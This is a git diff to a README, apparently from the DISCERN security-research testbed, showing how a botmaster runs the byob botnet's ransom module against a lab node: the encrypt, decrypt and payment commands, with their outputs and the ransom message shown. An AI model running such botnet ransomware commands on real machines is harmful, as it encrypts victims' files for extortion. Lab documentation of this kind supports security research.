@@ -133,18 +133,70 @@ Usage line in `ransom.py` [here](https://github.com/STEELISI/DISCERN/blob/6d8fb5
 usage = 'ransom <encrypt/decrypt/payment> <file_name> [pub key] [priv key]'
 ```
 
+#### Available Ransom Commands
+There are three commands through `byob` bot. They are as follows:
+- **encrypt** - `encrypt` would essentially encrypt the files with a key pair
+- **decrypt** - `decrypt` would essentially decrypt the files with a key pair
+- **payment** - `payment` would notify the bot nodes that you are hacked
+
+#### Encrypt Ransom Command Usage
+
+The **encrypt** command usage is as follows:
+
+On `botmaster` node where the server is running, a typical command would look like as follows:
+
 A command should look like this
-```
-ransom encrypt test.txt MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwr6x1f8XRzzi8Gvx8Uxys8Q/...IDAQAB MIIEpQIBAAKCAQEAwr6x1f8XRzzi8Gvx8Uxys8Q/...+kCUsXHpgh8oE=
-```
-
-#### Entering ransom commands through byob
-On botmaster node where the server is running, type the command:
-
 ```shell
-[ 0 @ /home/rishitsaiya ]>ransom encrypt test.txt pub priv
+[ 0 @ /home/rishitsaiya ]>ransom encrypt test.txt MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwr6x1f8XRzzi8Gvx8Uxys8Q/...IDAQAB MIIEpQIBAAKCAQEAwr6x1f8XRzzi8Gvx8Uxys8Q/...+kCUsXHpgh8oE=
+```
+It shall output with a message as follows:
+```shell
+test.txt encrypted
 ```
 
-It should look like this.
+Parallely, if you observe the content of `test.txt` at the `b1` node, it shall be as follows:
+```shell
+rishitsaiya@b1:~$ cat test.txt
+0DK4odBrMiSkh5WAoLlj94NuaGfmKpCggPCvX2LkC7DchCQu9nEwhyLM+/Nup8zyFYgiJQ==r
+```
+#### Decrypt Ransom Command Usage
 
-#### - To be Continued -
+The **decrypt** command usage is as follows:
+
+On `botmaster` node where the server is running, a typical command would look like as follows:
+
+A command should look like this
+```shell
+[ 0 @ /home/rishitsaiya ]>ransom decrypt test.txt MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwr6x1f8XRzzi8Gvx8Uxys8Q/...IDAQAB MIIEpQIBAAKCAQEAwr6x1f8XRzzi8Gvx8Uxys8Q/...+kCUsXHpgh8oE=
+```
+It shall output with a message as follows:
+```shell
+Decrypting files
+```
+
+Parallely, if you observe the content of `test.txt` at the `b1` node, it shall be as follows:
+```shell
+rishitsaiya@b1:~$ cat test.txt
+This is a test file.
+```
+
+#### Payment Ransom Command Usage
+The **payment** command usage is as follows:
+
+On `botmaster` node where the server is running, a typical command would look like as follows:
+
+A command should look like this
+```shell
+[ 0 @ /home/rishitsaiya ]>ransom payment
+```
+It shall output with a message as follows:
+```shell
+Launched a Windows Message Box with ransom payment information
+```
+This message can be re-altered if required through [here](https://github.com/STEELISI/DISCERN/blob/01bf739c1d0e06a202b4bb83e136a243a6e23dba/byob/byob/modules/ransom.py#L195).
+
+Parallely, if you observe the terminal where the payload is running on the `b1` node, there will be message printed there:
+```shell
+Hackers are here!
+```
+This message can be re-altered if required through [here](https://github.com/STEELISI/DISCERN/blob/01bf739c1d0e06a202b4bb83e136a243a6e23dba/byob/byob/modules/ransom.py#L191).
